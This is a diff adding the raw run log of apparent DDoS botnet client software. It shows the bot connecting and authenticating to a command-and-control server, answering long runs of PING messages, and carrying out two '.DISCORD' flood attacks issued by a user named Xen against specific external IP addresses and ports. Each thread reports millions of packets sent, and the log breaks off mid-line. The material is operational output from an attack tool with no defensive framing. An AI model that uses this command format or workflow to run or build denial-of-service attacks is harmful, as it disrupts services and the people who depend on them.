@@ -1,0 +1,628 @@
+[INIT] Bot starting...
+[INFO] Max users: 50, Max attacks per user: 10, Max threads: 1000
+[INFO] Connecting to C2: 127.0.0.1:1337
+[INFO] Connected! Waiting for authentication...
+[INFO] Sent username: x86_64
+[DEBUG] Generated HMAC-SHA256 for arch 'x86_64'
+[INFO] Authenticated successfully
+[INFO] Authenticated successfully with HMAC
+[INFO] Entering command loop...
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: .DISCORD 104.29.137.142 19322 90 10 Xen
+[INFO] Starting attack: .discord -> 104.29.137.142:19322 (90s, 10 threads) [User: Xen]
+[THREAD] Discord attack started, duration: 90 seconds
+[THREAD] Discord attack started, duration: 90 seconds
+[THREAD] Discord attack started, duration: 90 seconds
+[THREAD] Discord attack started, duration: 90 seconds
+[THREAD] Discord attack started, duration: 90 seconds
+[THREAD] Discord attack started, duration: 90 seconds
+[THREAD] Discord attack started, duration: 90 seconds
+[SUCCESS] Attack started with 10/10 threads
+[THREAD] Discord attack started, duration: 90 seconds
+[THREAD] Discord attack started, duration: 90 seconds
+[THREAD] Discord attack started, duration: 90 seconds
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[THREAD] Discord attack finished, sent 17975000 packets
+[THREAD] Discord attack finished, sent 14742000 packets
+[THREAD] Discord attack finished, sent 18204000 packets
+[THREAD] Discord attack finished, sent 9532000 packets
+[THREAD] Discord attack finished, sent 19088000 packets
+[THREAD] Discord attack finished, sent 19281000 packets
+[THREAD] Discord attack finished, sent 20101000 packets
+[THREAD] Discord attack finished, sent 20012000 packets
+[THREAD] Discord attack finished, sent 20584000 packets
+[THREAD] Discord attack finished, sent 8779000 packets
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[ERROR] Connection lost (recv_size=0), reconnecting...
+[INFO] Connection closed, retrying in 5s...
+[INFO] Connecting to C2: 127.0.0.1:1337
+[ERROR] Connection failed, retrying in 20s...
+[INFO] Connecting to C2: 127.0.0.1:1337
+[ERROR] Connection failed, retrying in 20s...
+[INFO] Connecting to C2: 127.0.0.1:1337
+[ERROR] Connection failed, retrying in 20s...
+[INFO] Connecting to C2: 127.0.0.1:1337
+[INFO] Connected! Waiting for authentication...
+[INFO] Sent username: x86_64
+[DEBUG] Generated HMAC-SHA256 for arch 'x86_64'
+[INFO] Authenticated successfully
+[INFO] Authenticated successfully with HMAC
+[INFO] Entering command loop...
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: .DISCORD 104.29.148.236 19329 30 10 Xen
+[INFO] Starting attack: .discord -> 104.29.148.236:19329 (30s, 10 threads) [User: Xen]
+[THREAD] Discord attack started, duration: 30 seconds
+[THREAD] Discord attack started, duration: 30 seconds
+[THREAD] Discord attack started, duration: 30 seconds
+[THREAD] Discord attack started, duration: 30 seconds
+[THREAD] Discord attack started, duration: 30 seconds
+[THREAD] Discord attack started, duration: 30 seconds
+[THREAD] Discord attack started, duration: 30 seconds
+[SUCCESS] Attack started with 10/10 threads
+[THREAD] Discord attack started, duration: 30 seconds
+[THREAD] Discord attack started, duration: 30 seconds
+[THREAD] Discord attack started, duration: 30 seconds
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[THREAD] Discord attack finished, sent 8759000 packets
+[THREAD] Discord attack finished, sent 9504000 packets
+[THREAD] Discord attack finished, sent 7630000 packets
+[THREAD] Discord attack finished, sent 10541000 packets
+[THREAD] Discord attack finished, sent 5845000 packets
+[THREAD] Discord attack finished, sent 6356000 packets
+[THREAD] Discord attack finished, sent 8607000 packets
+[THREAD] Discord attack finished, sent 8884000 packets
+[THREAD] Discord attack finished, sent 5788000 packets
+[THREAD] Discord attack finished, sent 5169000 packets
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded to PING
+[CMD] Received: PING
+[INFO] Responded
